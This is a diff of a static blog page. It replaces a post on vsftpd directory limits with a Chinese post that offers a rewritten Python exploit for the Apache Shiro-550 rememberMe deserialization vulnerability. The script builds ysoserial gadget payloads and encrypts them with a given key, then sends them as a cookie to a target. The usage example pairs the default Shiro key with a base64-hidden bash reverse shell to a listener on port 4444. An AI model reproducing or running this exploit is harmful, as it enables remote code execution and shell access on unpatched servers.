@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="解决kali安装vsftpd无法限制根目录, Nbb&#39;s Blog">
+    <meta name="keywords" content="shiro550_python脚本改写, Nbb&#39;s Blog">
     <meta name="description" content="It&#39;s Nbb&#39;s Blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>解决kali安装vsftpd无法限制根目录 | Nbb&#39;s Blog</title>
+    <title>shiro550_python脚本改写 | Nbb&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -204,12 +204,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">解决kali安装vsftpd无法限制根目录</h1>
+                    <h1 class="description center-align post-title">shiro550_python脚本改写</h1>
                 </div>
             </div>
         </div>
@@ -326,12 +326,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
-                                <span class="chip bg-color">流量分析</span>
+                            <a href="/tags/python/">
+                                <span class="chip bg-color">python</span>
                             </a>
                         
-                            <a href="/tags/ftp/">
-                                <span class="chip bg-color">ftp</span>
+                            <a href="/tags/shiro550/">
+                                <span class="chip bg-color">shiro550</span>
                             </a>
                         
                     </div>
@@ -342,8 +342,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%9D%82/" class="post-category">
-                                杂
+                            <a href="/categories/python/" class="post-category">
+                                python
                             </a>
                         
                     </div>
@@ -355,7 +355,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-02-04
+                    2021-02-26
                 </div>
                 
 
@@ -371,18 +371,58 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在kali上安装了vsftpd，根据说明手册，在配置文件中设置chroot_local_user=yes可以限制用户ftp访问在用户根目录下，但是我设置该选项后ftp就无法正常访问，网上也没有明确的资料</p>
-<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>设置chroot_local_user=yes然后用kali自带的火狐进行访问，抓包看了一下具体数据</p>
-<p><img src="1.jpg" alt="数据"></p>
-<p>第一个框里是浏览器先进行的ftp登录，先尝试匿名登录，然后用账户密码进行登录，登录完成后就能看见问题了，500报错，回应说拒绝在有写权限的根目录下工作，应该就是死在了写权限上</p>
-<p>去掉目录的写权限，正常工作，跨目录不起作用</p>
-<p><img src="2.jpg" alt="正常工作"></p>
-<p>最后改的时候发现，人家其实已经明确写在文件里了，这可能就是不识字的痛处吧</p>
-<p><img src="4.jpg" alt="说明"></p>
-<h2 id="chrome和火狐的区别"><a href="#chrome和火狐的区别" class="headerlink" title="chrome和火狐的区别"></a>chrome和火狐的区别</h2><p>之前没有目录限制的时候用本机测了一下，发现火狐多个上级目录，可以跳目录</p>
-<p><img src="5.jpg" alt="火狐"></p>
-<p>但是chrome就算开了跳目录也不行，只能在家目录下，不禁没有上级目录的选项，访问<a href="ftp://192.168.59.153/%E9%83%BD%E4%BC%9A%E8%A2%ABchrome%E9%87%8D%E7%BD%AE%E6%88%90%E5%AE%B6%E7%9B%AE%E5%BD%95">ftp://192.168.59.153/../都会被chrome重置成家目录</a></p>
-<p><img src="6.jpg" alt="chrome"></p>
+                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>shiro550是前几年出的一个比较好用的反序列化漏洞，特征也很明显，apache shiro版本小于1.2.4，返回包中有rememberme=deleteMe字段，网上也有很多漏洞复现的文章，很多都用了RMI来进行攻击，我对java反序列化也还是一知半解的水平，但是按我的理解应该是可以不用RMI，但是大部分复现文章都是用的RMI的方式，在学习了github上大神的利用脚本后我改写了一个短小的利用脚本来验证了一下我的想法</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+<span class="token keyword">import</span> uuid
+<span class="token keyword">import</span> subprocess
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> sys
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
+
+
+<span class="token keyword">def</span> <span class="token function">poc</span><span class="token punctuation">(</span>jar<span class="token punctuation">,</span> url<span class="token punctuation">,</span> command<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    popen <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> <span class="token string">'ysoserial.jar'</span><span class="token punctuation">,</span> jar<span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span>
+                             stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>
+    BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size
+    pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC
+    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>
+    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
+    file_body <span class="token operator">=</span> pad<span class="token punctuation">(</span>popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'rememberMe='</span> <span class="token operator">+</span> payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'</span><span class="token punctuation">}</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'rememberMe'</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"="</span><span class="token punctuation">}</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
+                         timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{}模块   key: {} 已成功发送！  状态码:{}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>jar<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{}模块   key: {} 发送异常！\n[-]   状态码:{}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>jar<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: python3 payload_gen.py  payload  url  command  key"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'paylaods:'</span><span class="token punctuation">)</span>
+        payloads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'CommonsBeanutils1'</span><span class="token punctuation">,</span> <span class="token string">'CommonsCollections1'</span><span class="token punctuation">,</span> <span class="token string">'CommonsCollections2'</span><span class="token punctuation">,</span> <span class="token string">'CommonsCollections3'</span><span class="token punctuation">,</span>
+                    <span class="token string">'CommonsCollections4'</span><span class="token punctuation">,</span> <span class="token string">'CommonsCollections5'</span><span class="token punctuation">,</span> <span class="token string">'CommonsCollections6'</span><span class="token punctuation">,</span> <span class="token string">'CommonsCollections7'</span><span class="token punctuation">,</span>
+                    <span class="token string">'CommonsCollections8'</span><span class="token punctuation">,</span> <span class="token string">'CommonsCollections9'</span><span class="token punctuation">,</span> <span class="token string">'CommonsCollections10'</span><span class="token punctuation">]</span>
+        <span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  '</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        paylaod <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+        url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+        command <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
+        key <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>
+        poc<span class="token punctuation">(</span>paylaod<span class="token punctuation">,</span> url<span class="token punctuation">,</span> command<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>脚本参数分别是要使用的ysoserial.jar的模块，url，命令，key，类似这样</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 poc.py CommonsBeanutils1 http://192.168.59.147:8080/ "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjE1My80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" kPH+bIxk5D2deZiIxcaaaA==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>脚本会调用ysoserial.jar生成序列化的字符串然后按照shiro的利用方式进行加密，然后会输出cookie中使用的rememberMe字段，并且向目标url发起请求</p>
 
             </div>
             <hr/>
@@ -408,7 +448,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/02/04/jie-jue-kali-an-zhuang-vsftpd-wu-fa-xian-zhi-gen-mu-lu/">http://example.com/2021/02/04/jie-jue-kali-an-zhuang-vsftpd-wu-fa-xian-zhi-gen-mu-lu/</a>
+                    <a href="http://example.com/2021/02/26/shiro550-python-jiao-ben-gai-xie/">http://example.com/2021/02/26/shiro550-python-jiao-ben-gai-xie/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -446,12 +486,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
-                                    <span class="chip bg-color">流量分析</span>
+                                <a href="/tags/python/">
+                                    <span class="chip bg-color">python</span>
                                 </a>
                             
-                                <a href="/tags/ftp/">
-                                    <span class="chip bg-color">ftp</span>
+                                <a href="/tags/shiro550/">
+                                    <span class="chip bg-color">shiro550</span>
                                 </a>
                             
                         </div>
@@ -493,9 +533,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/02/26/shiro550-python-jiao-ben-gai-xie/">
                     <div class="card-image">
@@ -513,9 +554,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -528,6 +569,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -550,31 +592,31 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/01/27/sslh-duan-kou-fu-yong/">
+                <a href="/2021/02/04/jie-jue-kali-an-zhuang-vsftpd-wu-fa-xian-zhi-gen-mu-lu/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="sslh端口复用">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="解决kali安装vsftpd无法限制根目录">
                         
-                        <span class="card-title">sslh端口复用</span>
+                        <span class="card-title">解决kali安装vsftpd无法限制根目录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            某一天晚上，晚上吃的烤肉，很香
+                            某一天下午
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-04
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E9%9A%A7%E9%81%93/" class="post-category">
-                                    隧道
+                            <a href="/categories/%E6%9D%82/" class="post-category">
+                                    杂
                                 </a>
                             
                             
@@ -584,12 +626,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/">
-                        <span class="chip bg-color">端口复用</span>
+                    <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+                        <span class="chip bg-color">流量分析</span>
                     </a>
                     
-                    <a href="/tags/sslh/">
-                        <span class="chip bg-color">sslh</span>
+                    <a href="/tags/ftp/">
+                        <span class="chip bg-color">ftp</span>
                     </a>
                     
                 </div>
